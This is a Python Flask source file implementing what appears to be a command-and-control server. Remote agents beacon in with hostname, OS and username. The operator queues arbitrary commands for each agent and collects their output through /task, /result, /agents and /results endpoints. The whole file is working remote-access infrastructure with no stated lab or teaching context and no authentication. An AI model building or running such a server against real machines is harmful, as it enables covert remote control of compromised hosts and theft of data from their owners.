from flask import Flask, request, jsonify
import uuid
from datetime import datetime

app = Flask(__name__)

# =========================
# Storage
# =========================
agents = {}
tasks = {}
results = []

# =========================
# Beacon Endpoint
# =========================
@app.route("/beacon", methods=["POST"])
def beacon():

    data = request.json

    agent_id = data.get("id")

    # Save agent info
    agents[agent_id] = {
        "hostname": data.get("hostname"),
        "os": data.get("os"),
        "user": data.get("user"),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    print("\n==============================")
    print(f"[+] Beacon From: {agent_id}")
    print("==============================")
    print(f"Hostname : {data.get('hostname')}")
    print(f"OS       : {data.get('os')}")
    print(f"User     : {data.get('user')}")

    # Send task if available
    if agent_id in tasks and tasks[agent_id]:

        task = tasks[agent_id].pop(0)

        print(f"\n[+] Sending Task -> {task['command']}")

        return jsonify({
            "task": task
        })

    return jsonify({
        "task": None
    })

# =========================
# Queue Task
# =========================
@app.route("/task", methods=["POST"])
def queue_task():

    data = request.json

    agent_id = data.get("id")
    command = data.get("command")

    if not agent_id or not command:
        return jsonify({
            "error": "Missing ID or command"
        }), 400

    # Create queue if agent not exists
    if agent_id not in tasks:
        tasks[agent_id] = []

    task_data = {
        "task_id": str(uuid.uuid4()),
        "command": command,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    tasks[agent_id].append(task_data)

    print("\n==============================")
    print("[+] Task Queued")
    print("==============================")
    print(f"Agent   : {agent_id}")
    print(f"Command : {command}")

    return jsonify({
        "status": "queued",
        "task": task_data
    })

# =========================
# Receive Result
# =========================
@app.route("/result", methods=["POST"])
def receive_result():

    data = request.json

    agent_id = data.get("id")
    output = data.get("output")

    result = {
        "agent": agent_id,
        "output": output,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    results.append(result)

    print("\n==============================")
    print("[+] Result Received")
    print("==============================")
    print(f"Agent : {agent_id}")
    print(f"Output:\n{output}")

    return jsonify({
        "status": "received"
    })

# =========================
# Show Agents
# =========================
@app.route("/agents", methods=["GET"])
def list_agents():

    return jsonify(agents)

# =========================
# Show Results
# =========================
@app.route("/results", methods=["GET"])
def list_results():

    return jsonify(results)

# =========================
# Main
# =========================
if __name__ == "__main__":

    print("\n[+] Server Started")
    print("[+] Listening on 0.0.0.0:5000\n")

    app.run(
        host="0.0.0.0",
        port=5000
    )
